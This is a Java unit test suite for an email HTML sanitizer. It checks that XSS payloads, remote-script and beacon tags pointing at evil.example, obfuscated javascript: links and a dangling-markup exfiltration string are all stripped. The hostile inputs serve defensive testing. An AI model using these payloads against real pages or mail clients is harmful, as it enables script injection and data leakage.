package io.kelta.worker.service.mailbox;

import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.params.ParameterizedTest;
import org.junit.jupiter.params.provider.ValueSource;

import static org.assertj.core.api.Assertions.assertThat;

/**
 * The platform's first defence against untrusted third-party HTML.
 *
 * <p>Every case here is a real delivery vector, not a hypothetical. The point of the suite is
 * that adding a tag or attribute to the safelist has to break something visible.
 */
@DisplayName("MailboxHtmlSanitizer")
class MailboxHtmlSanitizerTest {

    private final MailboxHtmlSanitizer sanitizer = new MailboxHtmlSanitizer();

    @ParameterizedTest(name = "strips {0}")
    @ValueSource(strings = {
            "<script>alert(1)</script>",
            "<SCRIPT SRC=//evil.example/x.js></SCRIPT>",
            "<style>body{background:url('//evil.example/beacon')}</style>",
            "<link rel=prefetch href='//evil.example/x'>",
            "<base href='//evil.example/'>",
            "<iframe src='//evil.example'></iframe>",
            "<object data='//evil.example'></object>",
            "<embed src='//evil.example'>",
            "<form action='//evil.example'><input name=x></form>",
            "<svg><script>alert(1)</script></svg>",
            "<math><mtext></mtext></math>",
            "<noscript><p>x</p></noscript>",
            "<template><p>x</p></template>",
    })
    @DisplayName("Dangerous elements do not survive")
    void stripsDangerousElements(String hostile) {
        String out = sanitizer.sanitize("<p>hello</p>" + hostile).html();
        assertThat(out).doesNotContainIgnoringCase("script")
                .doesNotContainIgnoringCase("<style")
                .doesNotContainIgnoringCase("<link")
                .doesNotContainIgnoringCase("<base")
                .doesNotContainIgnoringCase("<iframe")
                .doesNotContainIgnoringCase("<object")
                .doesNotContainIgnoringCase("<embed")
                .doesNotContainIgnoringCase("<form")
                .doesNotContainIgnoringCase("<svg")
                .doesNotContainIgnoringCase("<math");
        // The legitimate content is kept — a sanitiser that empties the message is not useful.
        assertThat(out).contains("hello");
    }

    @ParameterizedTest(name = "strips {0}")
    @ValueSource(strings = {
            "<p onclick=\"alert(1)\">x</p>",
            "<p onmouseover=alert(1)>x</p>",
            "<img src=x onerror=alert(1)>",
            "<p style=\"background:url('//evil.example')\">x</p>",
            "<p class=\"leak\" id=\"leak\">x</p>",
    })
    @DisplayName("Event handlers, inline style, class and id are all dropped")
    void stripsDangerousAttributes(String hostile) {
        String out = sanitizer.sanitize(hostile).html();
        assertThat(out).doesNotContainIgnoringCase("onclick")
                .doesNotContainIgnoringCase("onmouseover")
                .doesNotContainIgnoringCase("onerror")
                .doesNotContainIgnoringCase("style=")
                .doesNotContainIgnoringCase("class=")
                .doesNotContainIgnoringCase("id=");
    }

    @Test
    @DisplayName("Remote images are parked rather than loaded")
    void parksRemoteImages() {
        MailboxHtmlSanitizer.Result result =
                sanitizer.sanitize("<p>hi</p><img src=\"https://tracker.example/pixel.gif\" alt=\"\">");

        // A remote image is a read receipt: it tells the sender the exact moment an agent opened
        // the message, and leaks the agent's IP.
        //
        // Asserted as " src=" with the leading space rather than 'src="https://...' — the parked
        // attribute is data-kelta-remote-src, which ENDS in "src=", so a naive substring check
        // matches the very thing that proves the URL was parked correctly.
        assertThat(result.html()).doesNotContain(" src=");
        assertThat(result.html()).contains(MailboxHtmlSanitizer.REMOTE_SRC_ATTR);
        assertThat(result.html()).contains(MailboxHtmlSanitizer.BLOCKED_ATTR);
        assertThat(result.blockedImages()).isEqualTo(1);
        // The URL itself is preserved so the agent can opt into loading it.
        assertThat(result.html()).contains("tracker.example/pixel.gif");
    }

    @Test
    @DisplayName("Inline cid: images are rewritten to an internal reference")
    void rewritesCidImages() {
        MailboxHtmlSanitizer.Result result =
                sanitizer.sanitize("<img src=\"cid:logo@example\" alt=\"logo\">");

        assertThat(result.html()).contains(MailboxHtmlSanitizer.CID_ATTR + "=\"logo@example\"");
        assertThat(result.html()).doesNotContain("src=\"cid:");
        assertThat(result.blockedImages()).isZero();
    }

    @ParameterizedTest(name = "refuses href [{0}]")
    @ValueSource(strings = {
            "javascript:alert(1)",
            "JaVaScRiPt:alert(1)",
            "&#106;avascript:alert(1)",
            "java\tscript:alert(1)",
            "vbscript:msgbox(1)",
            "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
    })
    @DisplayName("Only http, https and mailto links keep their href")
    void refusesDangerousLinkSchemes(String href) {
        String out = sanitizer.sanitize("<a href=\"" + href + "\">click</a>").html();
        assertThat(out).doesNotContainIgnoringCase("javascript")
                .doesNotContainIgnoringCase("vbscript")
                .doesNotContainIgnoringCase("data:text/html");
        // The text survives; only the destination is removed.
        assertThat(out).contains("click");
    }

    @Test
    @DisplayName("Surviving links get rel=noopener and open in a new tab")
    void hardensSafeLinks() {
        String out = sanitizer.sanitize("<a href=\"https://example.com\">x</a>").html();
        assertThat(out).contains("href=\"https://example.com\"")
                .contains("rel=\"noopener noreferrer nofollow\"")
                .contains("target=\"_blank\"");
    }

    @Test
    @DisplayName("Comments are removed, including conditional ones")
    void removesComments() {
        String out = sanitizer.sanitize(
                "<p>a</p><!--[if IE]><script>alert(1)</script><![endif]--><!-- plain -->").html();
        assertThat(out).doesNotContain("<!--").doesNotContainIgnoringCase("script");
    }

    @Test
    @DisplayName("Dangling markup cannot swallow the rest of the document")
    void neutralisesDanglingMarkup() {
        // An unterminated attribute is a classic exfiltration trick: everything after it becomes
        // part of the URL. Parsing and re-serialising cannot preserve that.
        String out = sanitizer.sanitize(
                "<img src=\"https://evil.example/?x=<p>secret</p>").html();
        assertThat(out).doesNotContain("evil.example/?x=<p>");
    }

    @Test
    @DisplayName("Ordinary formatting and tables are preserved")
    void keepsLegitimateMarkup() {
        String out = sanitizer.sanitize("""
                <h2>Order</h2><p><strong>Bold</strong> and <em>italic</em></p>
                <table><tr><th scope="col">A</th><td colspan="2">B</td></tr></table>
                <ul><li>one</li></ul><blockquote>quoted</blockquote>
                """).html();
        assertThat(out).contains("<h2>", "<strong>", "<em>", "<table>", "<th", "colspan=\"2\"",
                "<ul>", "<li>", "<blockquote>");
    }

    @Test
    @DisplayName("Oversized input is refused rather than parsed")
    void refusesOversizedInput() {
        MailboxHtmlSanitizer.Result result = sanitizer.sanitize("<p>x</p>".repeat(400_000));
        assertThat(result.truncated()).isTrue();
        assertThat(result.html()).isNull();
    }

    @Test
    @DisplayName("Null and blank input yield nothing, not an exception")
    void handlesEmptyInput() {
        assertThat(sanitizer.sanitize(null).html()).isNull();
        assertThat(sanitizer.sanitize("   ").html()).isNull();
    }
}
